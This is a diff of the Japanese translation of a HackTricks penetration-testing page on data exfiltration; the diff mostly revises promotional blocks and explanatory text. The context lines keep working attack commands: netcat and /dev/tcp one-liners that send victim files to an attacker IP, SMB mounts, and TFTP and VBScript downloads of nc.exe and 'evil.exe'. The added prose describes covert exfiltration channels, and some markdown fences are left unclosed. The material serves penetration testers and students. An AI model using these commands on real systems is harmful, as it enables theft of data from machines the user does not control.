@@ -1,18 +1,19 @@
-# 情報の外部への持ち出し
+# 情報の外部流出
+
+{% hint style="success" %}
+AWSハッキングの学習と練習:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングの学習と練習: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary>HackTricksのサポート</summary>
 
-HackTricksをサポートする他の方法：
-
-- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-- [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-- **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する
-- **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください**
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
+* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、ハッキングトリックを共有してください。
 
 </details>
+{% endhint %}
 
 **Try Hard Security Group**
 
@@ -22,11 +23,11 @@ HackTricksをサポートする他の方法：
 
 ***
 
-## 情報の外部への持ち出しに使用される一般的にホワイトリストに登録されているドメイン
+## 情報を外部流出するために一般的にホワイトリストに登録されているドメイン
 
-一般的に悪用される可能性のあるホワイトリストに登録されているドメインを見つけるには、[https://lots-project.com/](https://lots-project.com/)をチェックしてください
+[https://lots-project.com/](https://lots-project.com/)をチェックして、悪用できる一般的にホワイトリストに登録されているドメインを見つける
 
-## Base64のコピー＆ペースト
+## Base64をコピー＆ペースト
 
 **Linux**
 ```bash
@@ -185,27 +186,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-## Exfiltration Techniques
-
-### Exfiltration Over Command and Control Channel
-
-During post-exploitation, an attacker can exfiltrate data over the command and control channel. This can be achieved by executing commands on the compromised system to transfer files or exfiltrate sensitive information to the attacker-controlled server.
-
-### Exfiltration Over Alternative Protocols
-
-Attackers can also exfiltrate data using alternative protocols such as DNS, ICMP, or HTTP. By encoding the data and sending it over these protocols, attackers can bypass network security controls and exfiltrate data without being detected easily.
-
-### Exfiltration Over Encrypted Channels
-
-To avoid detection, attackers may exfiltrate data over encrypted channels such as HTTPS or SSH. By leveraging encryption, attackers can make it harder for security tools to inspect the exfiltrated data, increasing the chances of successful exfiltration.
-
-### Exfiltration Using Steganography
-
-Steganography involves hiding data within other non-secret files or communication channels. Attackers can embed sensitive information within images, audio files, or other digital content and exfiltrate it without arousing suspicion.
-
-### Exfiltration Using Covert Channels
-
-Covert channels are hidden communication paths that are not normally used for data transfer. Attackers can leverage covert channels to exfiltrate data without being detected by traditional security mechanisms, making it challenging for defenders to monitor and prevent data exfiltration.
+Windowsは、データを外部に持ち出すための多くの方法を提供します。これには、ファイル転送プロトコル（FTP）、リモートデスクトップ接続、USBデバイス、電子メール、Webサービス、およびクラウドストレージが含まれます。
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -229,21 +210,19 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-NC（Netcat）は、ネットワーク通信を行うための便利なツールです。リバースシェルを作成したり、ファイルを転送したりする際に使用されます。
+NC（Netcat）は、ネットワーク通信を行うための便利なツールです。通常、NCはバックドアの作成やデータの転送など、悪意のある目的で使用されます。
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### 攻撃対象からファイルをダウンロード
+### 被害者からファイルをダウンロード
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### ターゲットへのファイルアップロード
-
-この手法は、攻撃者が機密データを盗み出すために使用することができます。攻撃者は、悪意のあるファイルをターゲットのシステムにアップロードし、そのファイルを使用してデータを盗み出すことができます。この手法を使用する際には、ファイルが検出されないように注意する必要があります。
+### ターゲットにファイルをアップロード
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -278,7 +257,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-XPおよび2003ではデフォルトで有効（他のOSではインストール時に明示的に追加する必要がある）
+XPおよび2003ではデフォルトで（他のOSではインストール時に明示的に追加する必要があります）
 
 Kaliでは、**TFTPサーバーを起動**します：
 ```bash
@@ -292,7 +271,7 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**被害者**で、Kaliサーバーに接続します：
+**被害者**で、Kaliサーバーに接続します:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -304,9 +283,21 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-### VBScript
+### VBScript Exfiltration Techniques
 
-VBScriptは、Windowsシステムで使用されるスクリプト言語であり、悪意のあるアクターがデータを外部に送信するために使用することができます。VBScriptを使用してデータを外部に送信する方法の1つは、ファイルを作成し、そのファイルにデータを書き込んでから、外部のサーバーにそのファイルをアップロードすることです。VBScriptを使用すると、データをエクスフィルトするための多くの方法が可能になります。
+VBScript can be used to exfiltrate data from a compromised system. Below are some common techniques used for data exfiltration using VBScript:
+
+1. **Writing to Files**: VBScript can write data to files on the system, which can then be transferred out.
+
+2. **Sending HTTP Requests**: VBScript can send HTTP requests to an external server with the exfiltrated data embedded in the request.
+
+3. **Email**: VBScript can be used to send emails with the exfiltrated data as attachments or within the email body.
+
+4. **DNS Tunneling**: VBScript can encode data and send it over DNS requests to a controlled server for exfiltration.
+
+5. **Executing Commands**: VBScript can execute commands to exfiltrate data through various channels.
+
+By leveraging these techniques, an attacker can exfiltrate sensitive data from a target system using VBScript.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -344,12 +335,17 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe`プログラムは、バイナリの検査だけでなく、**16進数からバイナリを再構築する機能**を持っています。これは、バイナリの16進数を提供することで、`debug.exe`がバイナリファイルを生成できることを意味します。ただし、`debug.exe`には**64 kbまでのファイルをアセンブリングするという制限**があることに注意することが重要です。
+`debug.exe`プログラムは、バイナリの検査だけでなく、**16進数からバイナリを再構築する機能**も持っています。これは、バイナリの16進数を提供することで、`debug.exe`がバイナリファイルを生成できることを意味します。ただし、重要な点として、debug.exeには**64 kbまでのファイルをアセンブリするという制限**があることに注意する必要があります。
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
+```markdown
+次に、テキストをwindows-shellにコピーして、nc.exeというファイルが作成されます。
+
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
@@ -360,16 +356,18 @@ wine exe2bat.exe nc.exe nc.txt
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+AWSハッキングの学習と実践：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングの学習と実践：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>でゼロからヒーローまでAWSハッキングを学びましょう！</summary>
+<summary>HackTricksのサポート</summary>
 
-HackTricksをサポートする他の方法：
-
-* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)で**フォロー**する
-* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
+* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してください。
 
 </details>
+{% endhint %}
+```
